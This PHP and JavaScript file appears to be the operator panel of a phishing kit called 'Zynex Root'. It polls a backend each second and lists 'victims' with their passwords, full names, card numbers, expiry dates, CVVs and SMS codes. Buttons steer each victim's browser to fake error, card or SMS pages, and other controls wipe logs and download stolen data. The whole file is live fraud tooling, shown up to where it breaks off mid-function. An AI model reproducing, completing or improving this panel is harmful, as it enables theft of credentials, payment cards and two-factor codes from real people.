<?php
require_once 'inc/config.php';  // Ensure these paths are correct
require_once 'inc/connect.php';

// Set default timezone
date_default_timezone_set('Europe/Dublin');

// Start session securely
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();  // Start session only if not already started
}

// Add HTTP security headers
header('X-Frame-Options: DENY'); // Prevent clickjacking
header('X-Content-Type-Options: nosniff'); // Prevent MIME-type sniffing
header('X-XSS-Protection: 1; mode=block'); // Enable XSS filter in older browsers
header('Referrer-Policy: strict-origin-when-cross-origin'); // Control referrer header

// Check if the user is logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

// Regenerate session ID to prevent session fixation attacks
if (!isset($_SESSION['regenerated'])) {
    session_regenerate_id(true);
    $_SESSION['regenerated'] = true;
}
?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Zynex Root - Home</title>

<!-- Stylesheets -->
<!-- Bootstrap CSS -->
<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
<!-- Font Awesome CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

<!-- Micron Animations CSS -->
<link rel="stylesheet" href="https://unpkg.com/webkul-micron@1.1.6/dist/css/micron.min.css">

<!-- Custom Font Icons -->
<link rel="stylesheet" href="css/font.css">

<!-- Toastr Alerts -->
<link rel="stylesheet" href="css/toastr.min.css">

<!-- Flags Icons -->
<link rel="stylesheet" href="css/flag-icon.css">

<!-- Google Fonts -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Muli:300,400,700">

<!-- Theme Stylesheet -->
<link rel="stylesheet" href="css/style.default.css" id="theme-stylesheet">

<!-- Custom Stylesheet -->
<link rel="stylesheet" href="css/custom.css">

<!-- Favicon -->
<link rel="icon" type="image/x-icon" href="img/favicon.ico">
<link rel="stylesheet" href="css/buttons.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

  <style>
    .blink_me {
      animation: blinker 1s linear infinite;
    }

    @keyframes blinker {
      50% {
        background-color: rgba(32, 120, 102, 0.3);

      }
    }
  </style>


<?= $robots_script ?>
</head>

<body>
  <header class="header">
    <nav class="navbar navbar-expand-lg">

      <div class="container-fluid d-flex align-items-center justify-content-between">
        <div class="navbar-header">
          <!-- Navbar Header-->
<a href="index.php">
    <img src="logo.png"  style="width: 70px; height: 70px; cursor: pointer;">
</a>          <!-- Sidebar Toggle Btn-->

        </div>
<!-- Add this style block in your <head> section or your CSS file -->
<style>
  .user-rectangle {
    display: inline-block;
    padding: 10px 20px; /* Top/Bottom and Left/Right padding */
    background-color: #2b2b3d; /* Background color */
    color: #ffffff; /* Text color */
    border-radius: 20px; /* Rounded corners */
    font-size: 18px; /* Font size */
    font-weight: bold;
    text-align: center;
    white-space: nowrap; /* Prevent wrapping */
    min-width: 120px; /* Optional: Minimum width */
  }
</style>

<!-- PHP and HTML to display the username inside the rectangle -->
<div class="sidebar-header d-flex align-items-center">
  <div class="title">
    <div class="user-rectangle">
      <?php echo htmlspecialchars($_SESSION['username']); ?>
    </div>
  </div>
</div>

<style>
  .support-button {
    display: inline-block;
    padding: 10px 25px; /* Top/Bottom and Left/Right padding */
    background-color: #2b2b3d; /* Dark gray background */
    color: white !important; /* White text */
    border-radius: 20px; /* Rounded corners for pill shape */
    font-size: 18px; /* Font size */
    font-weight: bold;
    text-decoration: none; /* Removes underline */
    transition: transform 0.3s, box-shadow 0.3s; /* Hover effects */
    white-space: nowrap; /* Prevent text wrapping */
  }

  .support-button:hover {
    transform: scale(1.05); /* Slight grow effect */
    box-shadow: 0 0 15px rgba(43, 43, 61, 0.75); /* Soft glow */
  }
</style>

<div class="sidebar-header d-flex align-items-center">
  <div class="title">
    <a href="https://t.me/zynexroot" class="support-button" target="_blank">
      Support
    </a>
  </div>
</div>


<style>
/* Container for Statistics */
.statistics-container {
    display: flex;
    flex-wrap: wrap;
    gap: 20px;
    justify-content: space-between;
    padding: 20px;
}

/* Individual Statistic Card */
.stat-block {
    background-color: #2b2b3d;
    padding: 15px 20px;
    border-radius: 10px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
    flex: 1;
    min-width: 200px;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.stat-block:hover {
    transform: translateY(-5px);
    box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.8);
}

/* Content Within Each Card */
.stat-details {
    display: flex;
    align-items: center;
    justify-content: space-between;
}

/* Header and Icon */
.stat-title {
    display: flex;
    align-items: center;
    color: #f0f0f0;
}

.stat-icon {
    background-color: #444455;
    padding: 10px;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-right: 10px;
    font-size: 24px;
    color: #ffffff;
}

/* Value Styling */
.stat-number {
    font-size: 24px;
    color: #f8f9fa;
    font-weight: bold;
}

/* Responsive Layout */
@media (max-width: 768px) {
    .statistics-container {
       /* flex-direction: column;
        gap: 15px; */
    }
}


</style>

	
<div class="statistics-container">
    <div class="stat-block">
        <div class="stat-details">
            <div class="stat-title">
                <div class="stat-icon"><i class="fas fa-chart-line"></i></div> <!-- Changed Icon -->
                <strong>Site Visits</strong> <!-- Updated Text -->
            </div>
            <div class="stat-number" id="total_visits"><?php echo total_visits($conn); ?></div>
        </div>
    </div>
    <div class="stat-block">
        <div class="stat-details">
            <div class="stat-title">
                <div class="stat-icon"><i class="fas fa-users"></i></div> <!-- Changed Icon -->
                <strong>Total Victims&nbsp;</strong> <!-- Updated Text -->
            </div>
            <div class="stat-number" id="total_victims"><?php echo total_victims($conn); ?></div>
        </div>
    </div>
    <div class="stat-block">
        <div class="stat-details">
            <div class="stat-title">
                <div class="stat-icon"><i class="fas fa-user-check"></i></div> <!-- Changed Icon -->
                <strong>Active Victims</strong> <!-- Updated Text -->
            </div>
            <div class="stat-number" id="online_victims"><?php echo online_victims($conn); ?></div>
        </div>
    </div>
    <div class="stat-block">
        <div class="stat-details">
            <div class="stat-title">
                <div class="stat-icon"><i class="fas fa-user-shield"></i></div> <!-- Changed Icon -->
                <strong>Current Crews</strong> <!-- Updated Text -->
            </div>
            <div class="stat-number" id="active_handlers"><?php echo online_handlers($conn); ?></div>
        </div>
    </div>
</div>

		
		
		
		
<!-- Title Section with Larger, White Icons -->
<div class="centered-icons-container">
<div class="title" style="background-color: #222; ">
    <i title="Reset Bans" onclick="reset_bans();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-recycle"></i>
    <i title="Reset Visits" onclick="reset_visits();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-globe"></i>
    <i title="Wipe Logs" onclick="wipe();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-trash"></i>
    <i title="Pause All Alerts" onclick="pause_all_alerts();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size: 24px; color: white;" class="fa fa-bell-slash"></i>
	<i title="Download All Data" onclick="saveAll();" style="padding-left:15px; float:right; vertical-align:middle; cursor:pointer; font-size:24px; color: white;" class="fa fa-download"></i>
</div>
</div>
<style>
@media (max-width: 600px) {
    .centered-icons-container {
        display: flex;          /* Enables flexbox layout which is great for centering content */
        justify-content: center; /* Centers flex items on the line (horizontally) */
        flex-wrap: wrap;         /* Allows items to wrap to the next line on small screens */
        width: 100%;             /* Takes full width to allow centering within the parent element */
    }

    .centered-icons-container .fa {
        float: none !important;  /* Important to override any inline 'float' styles */
        padding-left: 0 !important; /* Remove left padding when centered */
        padding-right: 15px;     /* Maintain some spacing between icons */
    }
}
</style>


<!-- Example JavaScript Functions -->
<!-- Existing style block adapted for a button -->


<!-- HTML to display the button -->
<div class="centered-icons-container">
<div class="list-inline-item logout" style="padding: 10px; display: flex; align-items: center;">
    <?php
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    // Only show the Settings and Crew links if logged in and not a Handler
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && $_SESSION['role'] !== 'Handler') {
    ?>
        <a href="settings.php" class="nav-link" style="color: white; padding: 5px 10px; margin-right: 5px;">
            <i class="fa fa-cog" style="font-size: 24px; margin-right: 5px;"></i>
            <span>Settings</span>
        </a>
        <a href="crew.php" class="nav-link" style="color: white; padding: 5px 10px; margin-right: 5px;">
            <i class="fa fa-users" style="font-size: 24px; margin-right: 5px;"></i>
            <span>Crew</span>
        </a>
    <?php
    }
    ?>
    <a id="logout" href="logout.php" class="nav-link" style="color: white; padding: 5px 10px;">
        <span class="d-none d-sm-inline">Logout</span>
        <i title="Logout" class="fa fa-sign-out-alt" style="font-size: 24px; margin-left: 5px;"></i>
    </a>
</div>
</div>



		</div>
      </div>
    </nav>
  </header>
  <div class="d-flex align-items-stretch">
    <!-- Sidebar Navigation-->




    <!-- Sidebar Navigation end-->
    <div class="page-content">

      <section class="no-padding-bottom">
        <div class="container-fluid">
          <div class="row">
            <div class="col-lg-12">
              <div class="block margin-bottom-sm">

                <div class="table-responsive">
				
				
<div class="scrollable-table-container">
<button class="scroll-button left" onclick="scrollTable(-1)">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M15 6l-6 6 6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
</button>    
<div class="scrollable-table">
        <table class="table">
                    <thead>
                      <tr>
                        <th>ID</th>
                        <th>Ping</th>
                        <th>IP</th>
						<th>Country</th>
                        <th>Username</th>
                        <th>Password</th>
						<th>FullName</th>
						<th>Card</th>
						<th>Exp</th>
						<th>CVV</th>
						<th>SMS-1</th>
						<th>SMS-2</th>
                        <th>Status</th>
                        <th>Action</th>
                      </tr>
                    </thead>
                    <tbody id="victims_table">

<?php
$query = mysqli_query($conn, "SELECT * from victims");
if ($query) {
    if (mysqli_num_rows($query) >= 1) {
        $array = array_filter(mysqli_fetch_all($query, MYSQLI_ASSOC));
    }
}

$redirects = "
<link rel='stylesheet' href='css/buttons.css'>

<div class='button-container'>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='3' title='Login Error'>
        <span>Login Error</span>
    </button>
	    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='90' title='subscription failed'>
        <span>Subscription-Failed </span>
    </button>
	
	    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='84' title='Billing Info'>
        <span>Billing-Info</span>
    </button>
	
	    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='86' title='Card Info'>
        <span>Card-Info</span>
    </button>
	    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='88' title='Card Error'>
        <span>Card-Error</span>
    </button>

    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='9' title='SMS-1'>
        <span>SMS-1</span>
    </button>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='11' title='SMS-1 Error'>
        <span>SMS-1 Error</span>
    </button>

	
    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='200' title='SMS-2'>
        <span>SMS-2</span>
    </button>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='202' title='SMS-2 Error'>
        <span>SMS-2 Error</span>
    </button>

    <button type='button' class='button finish-button' data-id='CHANGE_TO_ID' data-sts='0' title='Redirect'>
        <span>Redirect</span>
    </button>
</div>



";

$btns = "
<td style='vertical-align:middle;'>
    <div class='input-group-prepend' style='display: flex; gap: 10px;'>
        CHANGE_TO_REDIRECTS
        <button type='button' data-toggle='modal' data-target='#myModal' onclick='show_info(\"CHANGE_TO_ID\");' title='Show Details' style='flex: 1; background-color: #2196F3; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='icon-info'></i></button>
        <button type='button' onclick='save(\"CHANGE_TO_ID\");' title='Download' style='flex: 1; background-color: #4CAF50; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='icon-contract'></i></button>
        <button type='button' onclick='pause_alert(\"CHANGE_TO_ID\");' title='Silent Alert' style='flex: 1; background-color: #ff9800; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='fa fa-bell-slash'></i></button>
        <button type='button' onclick='ban(\"CHANGE_TO_ID\");' title='Ban' style='flex: 1; background-color: #673ab7; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='fa fa-ban'></i></button>
        <button type='button' onclick='remove(\"CHANGE_TO_ID\");' title='Delete' style='flex: 1; background-color: #f44336; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='icon-close'></i></button>
    </div>
</td>
";
?>



                    </tbody>
        </table>
    </div>
<button class="scroll-button right" onclick="scrollTable(1)">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
</button>
</div>
<style>
.scrollable-table-container {
    display: flex;
    align-items: center;
    width: 100%;
    position: relative; /* Ensures buttons can be positioned relative to the container */
    padding: 0 30px; /* Add padding to move buttons outside the scrollable area */
}

.scrollable-table {
    overflow-x: auto;
    width: calc(100% - 60px); /* Adjust width to account for padding */
    flex-grow: 1; /* Allows the table container to grow and shrink as needed */
}

button.scroll-button {
    position: absolute; /* Positioning buttons absolutely to align them */
    top: 62%; /* Aligns buttons vertically centered */
    transform: translateY(-50%); /* Perfectly centers buttons vertically */
    z-index: 2; /* Ensures buttons are above other content */
    color: white; /* Text color */
    border: none;
    padding: 2px;
    cursor: pointer;
	background-color: #2b2b3d;
}

button.scroll-button.left {
    left: 0; /* Positions the left button to the far left, outside the scrollable area */
}

button.scroll-button.right {
    right: 0; /* Positions the right button to the far right, outside the scrollable area */
}


/* @media (max-width: 768px) {
    /* Only display scroll buttons on screens smaller than 768px */
    button.scroll-button {
        display: block;
    }
}
*/

/* Style adjustments for smaller screens */
@media (max-width: 600px) {
    .scrollable-table-container {
        padding: 0 30px; /* Adds padding to avoid buttons overlapping table content */
    }
}



</style>
<style>
.dropdown-menu {
    max-height: 500px !important; /* Force the height to 500px */
    height: 500px !important; /* Explicitly set the height to 500px */
    overflow-y: auto !important; /* Allow scrolling if content exceeds 500px */
    z-index: 9999 !important; /* Force it to show on top of everything */
    position: absolute !important; /* Keep absolute positioning for Bootstrap compatibility */
}

/* Ensure the parent doesn't clip the dropdown */
.scrollable-table-container {
    overflow: visible !important; /* Prevent clipping */
    position: static !important; /* Remove the positioning context to prevent clipping */
}
</style>

<script>
function scrollTable(direction) {
    var container = document.querySelector('.scrollable-table');
    var scrollAmount = 200; // This determines the amount of scroll per click

    container.scrollBy({
        left: direction * scrollAmount,
        behavior: 'smooth' // This makes the scroll animation smooth
    });
}
</script>



                </div>
              </div>
            </div>
          </div>
        </div>





<style>
/* Modal */
.modal-open .modal {
  z-index: 9999;
}

.modal-open .modal .modal-dialog {
  max-width: 700px; /* Wider modal for a balanced look */
  margin: 1.5rem auto;
}

.modal-open .modal .modal-content {
  border-radius: 12px; /* Softly rounded corners */
  background-color: #EDEFF3; /* Light, neutral background */
  color: #33334d; /* Darker text for readability */
  border: 1px solid #D1D5DB; /* Light border for clean edges */
  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15); /* Soft shadow for depth */
}

.modal-open .modal .modal-header {
  background-color: #B3C4F3; /* Soft blue-purple for header background */
  color: #1E2749; /* Darker blue text for contrast */
  border-top-left-radius: 12px;
  border-top-right-radius: 12px;
  padding: 15px 20px;
}

.modal-open .modal .modal-title {
  font-size: 1.4rem;
  color: #1E2749; /* Dark title text */
  font-weight: bold;
}

.modal-open .modal .close {
  color: #6C757D; /* Muted color for close button */
  opacity: 0.9;
  font-size: 1.2rem;
}

.modal-open .modal .modal-body {
  padding: 20px;
  background-color: #F4F6FA; /* Slightly off-white background */
  color: #33334d;
}

.modal-open .modal .form-control {
  color: #33334d; /* Darker text for readability */
  background-color: #f7f9fc; /* Light background for input */
  border: 1px solid #D1D5DB; /* Light border */
  border-radius: 8px;
  padding: 10px;
}

.modal-open .modal-footer {
  background-color: #EDEFF3; /* Light footer background */
  border-bottom-left-radius: 12px;
  border-bottom-right-radius: 12px;
  padding: 15px;
  text-align: right;
}

/* Button styling */
.modal-open .modal-footer .btn {
  border-radius: 6px;
  background-color: #5063F2; /* Vibrant blue to match dashboard colors */
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-weight: bold;
  transition: background-color 0.3s ease, transform 0.1s ease;
}

.modal-open .modal-footer .btn:hover {
  background-color: #3D4BC3; /* Slightly darker blue on hover */
  transform: scale(1.05); /* Enlarge on hover for interactivity */
}

/* Optional: Textarea styling */
textarea#infomodalvalue {
  color: #33334d; /* Darker text */
  background-color: #f7f9fc; /* Light background */
  border: 1px solid #D1D5DB;
  border-radius: 8px;
  padding: 10px;
  resize: vertical;
  min-height: 150px;
}

</style>

        <!-- myModal-->
        <div id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" class="modal fade text-left">
          <div role="document" class="modal-dialog">

            <div class="modal-content">

              <div class="modal-header"><strong id="infomodaltitle" class="modal-title">#1 Victim Info</strong>
                <button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
              </div>

              <div class="modal-body">
                <div class="form-group">
                  <div id="infomodalvalue" style="height: auto" class="form-control"></div>
                </div>
              </div>

            </div>

          </div>
        </div>

        <!-- myModal-->

        <!-- myModal-->
        <div id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" class="modal fade text-left">
          <div role="document" class="modal-dialog">

            <div class="modal-content">

              <div class="modal-header"><strong id="infomodaltitle" class="modal-title">#1 Victim Info</strong>
                <button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
              </div>

              <div class="modal-body">
                <div class="form-group">
                  <textarea style="color:offwhite; background-color : #22252A;" id="infomodalvalue" cols="50" rows="20" class="form-control" disabled></textarea>
                </div>
              </div>

            </div>

          </div>
        </div>


      </section>

    </div>
  </div>
  <!-- JavaScript files-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/popper.js/umd/popper.min.js"> </script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
  <script src="vendor/jquery.cookie/jquery.cookie.js"> </script>
  <script src="vendor/jquery-validation/jquery.validate.min.js"></script>
  <script src="js/front.js"></script>
  <script src="js/toastr.min.js"></script>
  <script src="https://unpkg.com/webkul-micron@1.1.6/dist/script/micron.min.js"></script>
  <script src="js/other.js"></script>

<script>
    var isPaused = false;
    const btns = `<?php echo $btns; ?>`;
    const redirects = `<?php echo $redirects; ?>`;
	const removedIds = new Set();

    var timmer = setInterval(function() {
      var dropdown_open = document.getElementsByClassName('input-group-prepend show');
      if (dropdown_open.length > 0) {
        pause();
      } else {
        resume();
      }

      if (!isPaused) {
        var urldata = 'inc/api.php';
        $.ajax({
          url: urldata,
          type: 'GET',
          //async: false,
          cache: true,
          success: function(response) {
            var array = JSON.parse(response);
            array.victims.forEach(function(object) {
              if (!isPaused) {
                var buttons = btns.replace(/CHANGE_TO_ID/g, object.id.replace('row', ''));
                var js_redirects = redirects.replace(/CHANGE_TO_ID/g, object.id.replace('row', ''));

				buttons = buttons.replace(/CHANGE_TO_REDIRECTS/g, js_redirects);

                var element = document.getElementById(object.id);
                if (typeof(element) != 'undefined' && element != null) {

                  // console.log(element.innerHTML); // " => '   // &quot; => " // &amp; => &
                  // console.log(atob(object.info) + buttons);

                  var local_vic = element.innerHTML;
                  local_vic = local_vic.replace(/"/g, "'");
                  local_vic = local_vic.replace(/&quot;/g, '"');
                  local_vic = local_vic.replace(/&amp;/g, '&');
                  var online_vic = atob(object.info) + buttons;

                  if (local_vic !== online_vic) {
                    element.innerHTML = atob(object.info) + buttons;
                  }


                  if (object.buzzed == "0") {
                    element.classList.add("blink_me");
                    beep()
                  } else {
                    element.classList.remove("blink_me");
                  }




                } else {
                  var element = document.getElementById('victims_table');
                  element.innerHTML += '<tr id="' + object.id + '">' + atob(object.info) + buttons + '</tr>';
                  var new_element = document.getElementById(object.id);
                  if (object.buzzed == "0") {
                    new_element.classList.add("blink_me");
                    beep()
                  } else {
                    new_element.classList.remove("blink_me");
                  }
                }

              }
            });

            document.getElementById("total_visits").innerHTML = array.total_visits;
            document.getElementById("total_victims").innerHTML = array.total_victims;
            document.getElementById("online_victims").innerHTML = array.online_victims;
            document.getElementById("active_handlers").innerHTML = array.active_handlers;

            array.removed_ids.forEach(function(item) {
              if (item != '') {
                var old_element = document.getElementById(item);
                if (typeof(old_element) != 'undefined' && old_element != null) {
                  document.getElementById(item).remove();
                }
              }
            });

          }
        });
      }
    }, 1000);


/**
 * Update the victim row in the table
 */
function updateVictimRow(victim) {
    let row = document.getElementById(`row${victim.id}`);

    if (!row) {
        // Add new row if it doesn't exist
        const tableBody = document.getElementById("victimTableBody");
        if (tableBody) {
            row = document.createElement("tr");
            row.id = `row${victim.id}`;
            tableBody.appendChild(row);
        }
    }

    // Update only if content has changed
    const newContent = atob(victim.info);
    if (row.innerHTML !== newContent) {
        row.innerHTML = newContent; // Minimal updates
    }
}

/**
 * Update the counters in the UI
 */
function updateCounters(counters) {
    Object.entries(counters).forEach(([key, value]) => {
        const counterElement = document.getElementById(key);
        if (counterElement) {
            counterElement.textContent = value;
        }
    });
}



/**
 * Remove old rows from the table
 * @param {Array} removedIds - An array of IDs to remove
 */
function removeOldRows(removedIds) {
    if (!removedIds || !Array.isArray(removedIds)) return;

    removedIds.forEach(id => {
        const row = document.getElementById(`row${id}`);
        if (row) {
            // Stop effects safely before removing
            row.classList.remove("buzz_overlay", "blink_me");
            row.remove(); // Remove row immediately
        }
    });
}

/**
 * Poll for buzz updates every second for near-instant buzz functionality.
 */
function pollBuzzUpdates() {
    setInterval(() => {
        if (!isPaused) {
            fetch('inc/api.php?buzz=1')
                .then(response => response.json())
                .then(data => {
                    if (data.buzzed_victims && Array.isArray(data.buzzed_victims)) {
                        data.buzzed_victims.forEach(object => {
                            handleBuzz(object.id); // Trigger buzz effect
                            updateVictimRow(object); // Update row
                        });
                    }
                })
                .catch(err => console.error("Error fetching buzz updates:", err));
        }
    }, 1000); // Reduced to 500ms for near-instant buzz
}

/**
 * Pause updates
 */
function pause() {
    isPaused = true;
}

/**
 * Resume updates
 */
function resume() {
    isPaused = false;
}

/**
 * Update the counters for total visits, victims, and online handlers
 * @param {Object} data - The data object containing counter values
 */
function updateCounters(data) {
    document.getElementById("total_visits").innerText = data.total_visits;
    document.getElementById("total_victims").innerText = data.total_victims;
    document.getElementById("online_victims").innerText = data.online_victims;
    document.getElementById("active_handlers").innerText = data.active_handlers;
}



/**
 * Update or add a victim row in the table
 * @param {Object} object - The victim data object
 */
function updateVictimRow(object) {
    var buttons = btns.replace(/CHANGE_TO_ID/g, object.id.replace('row', ''));
    var js_redirects = redirects.replace(/CHANGE_TO_ID/g, object.id.replace('row', ''));
    buttons = buttons.replace(/CHANGE_TO_REDIRECTS/g, js_redirects);

    var element = document.getElementById(object.id);

    if (element) {
        // Update an existing row
        updateRowContent(element, object, buttons);
    } else {
        // Add a new row
        addNewRow(object, buttons);
    }
}

/**
 * Update the content of an existing row
 * @param {HTMLElement} element - The table row element
 * @param {Object} object - The victim data object
 * @param {String} buttons - The generated button HTML
 */
function updateRowContent(element, object, buttons) {
    var local_vic = element.innerHTML;
    local_vic = sanitizeHtml(local_vic);

    var online_vic = atob(object.info) + buttons;

    if (local_vic !== online_vic) {
        element.innerHTML = online_vic;
    }

    // Handle the blinking effect for the row
    if (object.buzzed === "0") {
        element.classList.add("blink_me");
        beep();
    } else {
        element.classList.remove("blink_me");
    }
}

/**
 * Add a new row to the victims table
 * @param {Object} object - The victim data object
 * @param {String} buttons - The generated button HTML
 */
function addNewRow(object, buttons) {
    var victimsTable = document.getElementById("victims_table");
    if (victimsTable) {
        // Create a new table row
        var newRow = document.createElement("tr");
        newRow.setAttribute("id", object.id);

        // Decode victim info and append to the row
        var victimInfo = atob(object.info);
        newRow.innerHTML = victimInfo + buttons;

        // Append the new row to the victims table
        victimsTable.appendChild(newRow);
    }
}

/**
 * Handle buzz action for a specific victim
 * @param {String} id - The ID of the victim
 */
function handleBuzz(id) {
    const row = document.getElementById(id);
    if (row) {
        row.classList.add("buzz_overlay");
        beep();

        setTimeout(() => {
            row.classList.remove("buzz_overlay");
        }, 360000); // End the buzz effect after 5 seconds
    }
}
/**
 * Sanitize HTML by replacing problematic characters
 * @param {String} html - The HTML string to sanitize
 * @returns {String} - The sanitized HTML
 */
function sanitizeHtml(html) {
    return html
        .replace(/"/g, "'")
        .replace(/&quot;/g, '"')
        .replace(/&amp;/g, '&');
}

/**
 * Beep alert
 */
var lastBeepTime = 0; // Store the time when the last beep occurred

var alertSound = new Audio("inc/alert.mp3");
var lastBeepTime = 0;

function beep() {
    var now = Date.now();
    if (now - lastBeepTime >= 700) {
        alertSound.currentTime = 0; // rewind to start
        alertSound.play().catch(() => {});
        lastBeepTime = now;
    }
}


function setCustomRedirect() {
    resume();

    // Ask for a custom URL
    var customURL = prompt("Enter the URL for redirection:");

    if (customURL !== null && customURL !== "") {
        const data = new URLSearchParams({
            'custom_redirect': customURL
        });

        console.log("Sending request to action.php:", data.toString()); // Debugging log

        fetch('inc/action.php?type=custom_redirect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: data.toString()
        })
        .then(response => response.json())
        .then(parsed_data => {
            console.log("Response from action.php:", parsed_data); // Debugging log

            if (parsed_data.status === 'ok') {
                toastr["success"]("Custom redirection URL set successfully");
            } else {
                toastr["error"]("Failed: " + parsed_data.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while setting the redirection URL");
        });
    }
}
</script>

<script>
document.addEventListener("click", function (e) {
    const btn = e.target.closest("button[data-id]");
    if (!btn) return;

    const id = btn.getAttribute("data-id");
    const sts = btn.getAttribute("data-sts");
    const needsParm = btn.hasAttribute("data-parm");

    pause();

    if (needsParm && sts) {
        command_with_parms(id, sts);
    } else if (sts !== null) {
        command(id, sts);
    }
});
</script>



<script>
function remove(id) {
    if (!id) {
        toastr["error"]("Invalid ID provided.");
        return;
    }

    const row = document.getElementById("row" + id);
    if (row) row.remove();

    // Add to removed IDs to prevent re-adding during updates
    removedIds.add("row" + id);

    console.time("deleteAction");
    fetch('inc/action.php?type=remove', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'userid=' + encodeURIComponent(id)
    })
    .then(response => response.ok ? response.json() : Promise.reject("Network response was not ok"))
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            console.timeLog("deleteAction", "Row removed successfully");
            toastr["success"]("Successfully deleted");
        } else {
            toastr["error"]("Failed to remove #" + id);
            removedIds.delete("row" + id); // Allow re-adding on failure
        }
    })
    .catch(error => {
        console.error("Error:", error);
        toastr["error"]("An error occurred while removing #" + id);
        removedIds.delete("row" + id); // Allow re-adding on failure
    })
    .finally(() => console.timeEnd("deleteAction"));
}




function ban(id) {
    fetch('inc/action.php?type=ban', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'userid=' + id
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            toastr["success"]("Successfully banned");
        } else if (parsed_data.status === 'notok') {
            toastr["error"]("Failed to ban #" + id);
        } else {
            toastr["error"]("Invalid user ID or action failed.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while banning #" + id);
    });
}




function save(id) {
    fetch('inc/action.php?type=getinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'userid=' + id
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            var htmlContent = parsed_data.info;

            // Initialize the log content
            var log = '';
            var alreadyProcessedKeys = new Set();  // To avoid duplicate fields

            // Use a DOMParser to parse the HTML content
            var doc = new DOMParser().parseFromString(htmlContent, "text/html");
            var rows = doc.querySelectorAll("table tr");

            // Loop through each row to extract the key-value pairs
            rows.forEach(row => {
                var cells = row.querySelectorAll("td");
                if (cells.length === 2) {  // Ensure there are exactly two cells per row for key-value pairs
                    var key = cells[0].textContent.trim();
                    var value = cells[1].textContent.trim();

                    // Process only if the key hasn't been processed yet
                    if (!alreadyProcessedKeys.has(key)) {
                        alreadyProcessedKeys.add(key);
                        log += `${key}: ${value || ' '}\n`;  // Handle empty fields
                    }
                }
            });

            // Create a text file from the log content directly
            var textFileAsBlob = new Blob([log], { type: 'text/plain' });
            var d = new Date();
            var fileNameToSaveAs = `UserData_${id}_${d.getMonth() + 1}-${d.getDate()}-${d.getFullYear()}.txt`;

            // Create and click the download link without appending it to the DOM
            var downloadLink = document.createElement("a");
            downloadLink.download = fileNameToSaveAs;
            downloadLink.href = URL.createObjectURL(textFileAsBlob);
            downloadLink.click();  // Directly trigger download
            toastr["success"]("Log successfully saved!");
        } else {
            toastr["error"]("Failed to save log #" + id);
        }
